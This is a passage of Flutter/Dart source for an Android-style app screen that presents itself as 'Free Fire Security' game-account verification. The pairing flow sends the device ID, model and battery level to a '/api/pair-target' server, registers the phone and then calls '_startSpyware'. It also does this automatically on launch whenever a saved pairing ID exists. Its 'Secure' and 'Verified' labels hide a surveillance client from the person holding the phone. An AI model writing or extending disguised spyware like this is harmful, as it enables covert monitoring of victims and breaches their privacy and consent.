  String _currentPairId = '';

  late AnimationController _glowController;
  late Animation<double> _glowAnimation;

  @override
  void initState() {
    super.initState();
    _checkAlreadyPaired();

    _glowController = AnimationController(
      duration: const Duration(milliseconds: 1500), 
      vsync: this,
    )..repeat(reverse: true);
    
    _glowAnimation = Tween<double>(begin: 0.3, end: 0.8).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() { 
    _glowController.dispose();
    _idCtrl.dispose(); 
    super.dispose();
  }

  Future<void> _checkAlreadyPaired() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final savedPair = prefs.getString('pairId');
      if (savedPair != null && savedPair.isNotEmpty) {
        // Verifikasi ke server apakah pairId masih valid
        final res = await http.post(
          Uri.parse('$kServerBase/api/pair-target'),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "pairId": savedPair,
            "deviceId": globalDeviceId,
            "model": globalDeviceModel,
            "battery": "100",
          }),
        ).timeout(const Duration(seconds: 10));
        
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['status'] == 'paired') {
            setState(() { 
              _paired = true; 
              _msg = 'Connected successfully!';
              _currentPairId = savedPair;
            });
            _startSpyware(globalDeviceId);
            return;
          }
        }
        // Jika invalid, hapus pairId
        await prefs.remove('pairId');
        setState(() { _paired = false; _msg = ''; });
      }
    } catch (_) {
      setState(() { _paired = false; _msg = ''; });
    }
  }

  Future<void> _doPair() async {
    final id = _idCtrl.text.trim().toUpperCase();
    if (id.isEmpty) { 
      setState(() => _msg = 'Please enter Pairing ID'); 
      return;
    }

    setState(() { _loading = true; _msg = 'Connecting...'; });
    
    try {
      final bat = Battery();
      int lv = await bat.batteryLevel.catchError((_) => 100);
      
      final res = await http.post(
        Uri.parse("$kServerBase/api/pair-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "pairId": id,
          "deviceId": globalDeviceId,
          "model": globalDeviceModel,
          "battery": lv.toString(),
        }),
      ).timeout(const Duration(seconds: 15));
      
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['status'] == 'paired') {
          final prefs = await SharedPreferences.getInstance();
          await prefs.setString('pairId', id);
          await _registerDevice(globalDeviceId, globalDeviceModel);
          _startSpyware(globalDeviceId);
          setState(() { 
            _loading = false; 
            _paired = true; 
            _msg = 'Connected successfully!';
            _currentPairId = id;
          });
          return;
        } else {
          setState(() { 
            _loading = false; 
            _msg = data['error'] ?? 'Invalid Pairing ID. Please check with your owner.'; 
          });
          return;
        }
      } else {
        setState(() { 
          _loading = false; 
          _msg = 'Server error (${res.statusCode}). Please try again.'; 
        });
        return;
      }
    } catch (e) {
      setState(() { 
        _loading = false; 
        _msg = 'Connection error: ${e.toString().replaceAll('Exception: ', '')}'; 
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Animated gradient background
          AnimatedBuilder(
            animation: _glowAnimation,
            builder: (context, child) {
              return Container(
                decoration: BoxDecoration(
                  gradient: RadialGradient(
                    center: const Alignment(0.5, -0.3),
                    radius: 1.2,
                    colors: [
                      Colors.red.shade900.withOpacity(_glowAnimation.value * 0.15),
                      Colors.black,
                      Colors.black,
                    ],
                  ),
                ),
              );
            },
          ),
          
          // Subtle grid pattern
          CustomPaint(
            painter: GridPainter(),
            size: Size.infinite,
          ),
          
          // Main content
          SafeArea(
            child: SingleChildScrollView(
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 24),
                child: Column(
                  children: [
                    const SizedBox(height: 40),
                    
                    // Logo with neon effect
                    Stack(
                      alignment: Alignment.center,
                      children: [
                        Container(
                          width: 80,
                          height: 80,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            gradient: LinearGradient(
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                              colors: [Colors.red.shade700, Colors.red.shade900],
                            ),
                            boxShadow: [
                              BoxShadow(
                                color: Colors.red.shade500.withOpacity(0.4),
                                blurRadius: 20,
                                spreadRadius: 4,
                              ),
                            ],
                          ),
                          child: const Icon(
                            Icons.flash_on_rounded,
                            color: Colors.white,
                            size: 40,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 16),
                    
                    // Title
                    const Text(
                      'Free Fire Security',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 28,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 6,
                      ),
                    ),
                    const SizedBox(height: 6),
                    
                    Container(
                      width: 40,
                      height: 2,
                      color: Colors.red.shade700,
                    ),
                    const SizedBox(height: 20),
                    
                    // Game Verification Badge
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [Colors.red.shade900.withOpacity(0.3), Colors.purple.shade900.withOpacity(0.2)],
                        ),
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(color: Colors.red.shade700.withOpacity(0.3), width: 1),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Container(
                            width: 8,
                            height: 8,
                            decoration: const BoxDecoration(
                              color: Colors.green,
                              shape: BoxShape.circle,
                            ),
                          ),
                          const SizedBox(width: 10),
                          const Text(
                            'VERIFIED GAME ACCOUNT',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 10,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 2,
                            ),
                          ),
                        ],
                      ),
                    ),
                    
                    const SizedBox(height: 20),
                    
                    Text(
                      _paired ? 'Device Connected' : 'Connect Your Device',
                      style: TextStyle(
                        color: _paired ? Colors.green.shade400 : Colors.grey.shade400,
                        fontSize: 14,
                        fontWeight: FontWeight.w500,
                        letterSpacing: 1,
                      ),
                    ),
                    
                    const SizedBox(height: 40),
                    
                    // Main Card
                    Container(
                      padding: const EdgeInsets.all(24),
                      decoration: BoxDecoration(
                        color: const Color(0xFF0A0A0A),
                        borderRadius: BorderRadius.circular(24),
                        border: Border.all(
                          color: _paired 
                              ? Colors.green.shade800.withOpacity(0.3) 
                              : Colors.red.shade900.withOpacity(0.3),
                          width: 1,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.black.withOpacity(0.5),
                            blurRadius: 30,
                            offset: const Offset(0, 10),
                          ),
                        ],
                      ),
                      child: Column(
                        children: [
                          if (_paired) ...[
                            // Connected State
                            Container(
                              width: 70,
                              height: 70,
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                color: Colors.green.shade900.withOpacity(0.2),
                                border: Border.all(color: Colors.green.shade400, width: 2),
                              ),
                              child: Icon(
                                Icons.check_circle_rounded,
                                color: Colors.green.shade400,
                                size: 50,
                              ),
                            ),
                            const SizedBox(height: 16),
                            Text(
                              'Connected Successfully',
                              style: TextStyle(
                                color: Colors.green.shade400,
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            const SizedBox(height: 8),
                            Container(
                              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                              decoration: BoxDecoration(
                                color: Colors.green.shade900.withOpacity(0.1),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(color: Colors.green.shade800.withOpacity(0.2)),
                              ),
                              child: Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  const Icon(Icons.vpn_key, color: Colors.green, size: 14),
                                  const SizedBox(width: 8),
                                  Text(
                                    _currentPairId,
                                    style: TextStyle(
                                      color: Colors.green.shade300,
                                      fontSize: 13,
                                      fontFamily: 'monospace',
                                      letterSpacing: 1,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                            const SizedBox(height: 20),
                            Row(
                              children: [
                                Expanded(
                                  child: Container(
                                    padding: const EdgeInsets.all(12),
                                    decoration: BoxDecoration(
                                      color: Colors.green.shade900.withOpacity(0.05),
                                      borderRadius: BorderRadius.circular(12),
                                      border: Border.all(color: Colors.green.shade800.withOpacity(0.1)),
                                    ),
                                    child: Column(
                                      children: [
                                        const Icon(Icons.speed, color: Colors.green, size: 20),
                                        const SizedBox(height: 4),
                                        Text(
                                          'Active',
                                          style: TextStyle(
                                            color: Colors.green.shade400,
                                            fontSize: 11,
                                            fontWeight: FontWeight.w500,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Container(
                                    padding: const EdgeInsets.all(12),
                                    decoration: BoxDecoration(
                                      color: Colors.green.shade900.withOpacity(0.05),
                                      borderRadius: BorderRadius.circular(12),
                                      border: Border.all(color: Colors.green.shade800.withOpacity(0.1)),
                                    ),
                                    child: Column(
                                      children: [
                                        const Icon(Icons.security, color: Colors.green, size: 20),
                                        const SizedBox(height: 4),
                                        Text(
                                          'Secure',
                                          style: TextStyle(
                                            color: Colors.green.shade400,
                                            fontSize: 11,
                                            fontWeight: FontWeight.w500,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 20),
                            SizedBox(
                              width: double.infinity,
                              height: 48,
                              child: OutlinedButton(
                                onPressed: () async {
                                  final prefs = await SharedPreferences.getInstance();
                                  await prefs.remove('pairId');
                                  setState(() { 
                                    _paired = false; 
                                    _msg = ''; 
                                    _idCtrl.clear();
                                    _currentPairId = '';
                                  });
                                },
                                style: OutlinedButton.styleFrom(
                                  side: BorderSide(color: Colors.red.shade700, width: 1),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                ),
                                child: Text(
                                  'Disconnect',
                                  style: TextStyle(
                                    color: Colors.red.shade400,
                                    fontSize: 13,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ),
                            ),
                          ] else ...[
                            // Not Connected State
                            const Text(
                              'Enter Pairing ID',
                              style: TextStyle(color: Colors.grey.shade400, fontSize: 12),
                            ),
                            const SizedBox(height: 16),
                            
                            Container(
                              decoration: BoxDecoration(
                                color: const Color(0xFF141414),
                                borderRadius: BorderRadius.circular(14),
                                border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                              ),
                              child: TextField(
                                controller: _idCtrl,
                                textAlign: TextAlign.center,
                                textCapitalization: TextCapitalization.characters,
                                style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 18,
                                  letterSpacing: 4,
                                  fontWeight: FontWeight.w600,
                                ),
                                decoration: InputDecoration(
                                  hintText: 'ENTER PAIRING ID',
                                  hintStyle: TextStyle(
                                    color: Colors.white.withOpacity(0.12),
                                    fontSize: 12,
                                    letterSpacing: 2,
                                  ),
                                  border: InputBorder.none,
                                  contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
                                ),
                                onSubmitted: (_) => _doPair(),
                              ),
                            ),
                            
                            if (_msg.isNotEmpty) ...[
                              const SizedBox(height: 14),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                                decoration: BoxDecoration(
                                  color: _msg.contains('success') || _msg.contains('Connected')
                                      ? Colors.green.shade900.withOpacity(0.1)
                                      : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                          ? Colors.red.shade900.withOpacity(0.1)
                                          : Colors.grey.shade800.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(10),
                                  border: Border.all(
                                    color: _msg.contains('success') || _msg.contains('Connected')
                                        ? Colors.green.shade700.withOpacity(0.2)
                                        : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                            ? Colors.red.shade700.withOpacity(0.2)
                                            : Colors.grey.shade700.withOpacity(0.2),
                                  ),
                                ),
                                child: Row(
                                  children: [
                                    Icon(
                                      _msg.contains('success') || _msg.contains('Connected')
                                          ? Icons.check_circle
                                          : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                              ? Icons.error
                                              : Icons.info,
                                      color: _msg.contains('success') || _msg.contains('Connected')
                                          ? Colors.green.shade400
                                          : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                              ? Colors.red.shade400
                                              : Colors.grey.shade400,
                                      size: 16,
                                    ),
                                    const SizedBox(width: 10),
                                    Expanded(
                                      child: Text(
                                        _msg,
                                        style: TextStyle(
                                          color: _msg.contains('success') || _msg.contains('Connected')
                                              ? Colors.green.shade400
                                              : _msg.contains('Invalid') || _msg.contains('error') || _msg.contains('Error')
                                                  ? Colors.red.shade400
                                                  : Colors.grey.shade400,
                                          fontSize: 12,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                            
                            const SizedBox(height: 20),
                            
                            SizedBox(
                              width: double.infinity,
                              height: 52,
                              child: ElevatedButton(
                                onPressed: _loading ? null : _doPair,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.red.shade900,
                                  foregroundColor: Colors.white,
                                  elevation: 0,
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(14),
                                  ),
                                ),
                                child: _loading
                                    ? SizedBox(
                                        width: 22,
                                        height: 22,
                                        child: CircularProgressIndicator(
                                          color: Colors.white,
                                          strokeWidth: 2,
                                        ),
                                      )
                                    : const Text(
                                        'CONNECT DEVICE',
                                        style: TextStyle(
                                          fontWeight: FontWeight.w600,
                                          letterSpacing: 2,
                                          fontSize: 14,
                                        ),
                                      ),
                              ),
                            ),
                          ],
                        ],
                      ),
                    ),
                    
                    const SizedBox(height: 30),
                    
                    // Footer info
                    Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: Colors.grey.shade900.withOpacity(0.3),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.grey.shade800.withOpacity(0.2)),
                      ),
                      child: Column(
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.gamepad, color: Colors.red.shade400, size: 14),
                              const SizedBox(width: 8),
                              Text(
                                'GAME VERIFICATION',
                                style: TextStyle(
                                  color: Colors.red.shade400,
                                  fontSize: 10,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 8),
                          Text(
                            'Pairing ID is provided by account owner • Secure connection',
                            style: TextStyle(
                              color: Colors.grey.shade600,
                              fontSize: 10,
                              letterSpacing: 0.5,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ],
                      ),
                    ),
                    
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// Custom painter for subtle grid background
class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = const Color(0xFF1A1A1A)
      ..strokeWidth = 0.5
      ..style = PaintingStyle.stroke;
    
    const spacing = 30.0;
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}